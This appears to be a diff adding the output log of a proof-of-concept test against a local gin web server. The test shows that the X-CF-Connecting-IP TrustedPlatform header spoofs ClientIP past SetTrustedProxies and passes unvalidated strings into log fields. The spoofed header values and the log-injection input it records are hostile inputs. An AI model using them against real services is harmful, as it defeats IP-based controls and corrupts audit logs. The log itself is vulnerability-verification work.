@@ -1,0 +1,15 @@
+==============================================================================
+VULN-003: ClientIP() returns unvalidated TrustedPlatform header (spoof + log injection)
+target: http://localhost:36276
+[INFO] exercising gin code path: context.go:999-1004 (TrustedPlatform returned verbatim & first)
+==============================================================================
+[STEP] baseline: X-Forwarded-For: 9.9.9.9 (peer NOT trusted -> must be ignored)
+[INFO] baseline -> clientIP='172.19.0.1' remoteIP='172.19.0.1'
+[STEP] attack: X-CF-Connecting-IP: 6.6.6.6  (returned verbatim, before the trust checks)
+[INFO] attack -> clientIP='6.6.6.6' remoteIP='172.19.0.1'
+[STEP] log-inj: X-CF-Connecting-IP: 'not-an-ip-INJECTED-value'  (no net.ParseIP -> arbitrary string as ClientIP)
+[INFO] raw-value -> clientIP='not-an-ip-INJECTED-value'
+[PROOF] a CORRECT SetTrustedProxies ignored X-Forwarded-For (clientIP stayed 172.19.0.1), yet X-CF-Connecting-IP set clientIP to 6.6.6.6 — TrustedPlatform bypasses it
+[PROOF] non-IP value 'not-an-ip-INJECTED-value' returned verbatim as ClientIP (no net.ParseIP) -> CR/LF/ANSI would inject into the Logger %15s field
+[OK] exploit confirmed — TrustedPlatform header spoofs ClientIP (defeats SetTrustedProxies) and is unvalidated
+==> VULN-003: CONFIRMED — TrustedPlatform header returned verbatim as ClientIP -> spoof + log-injection primitive
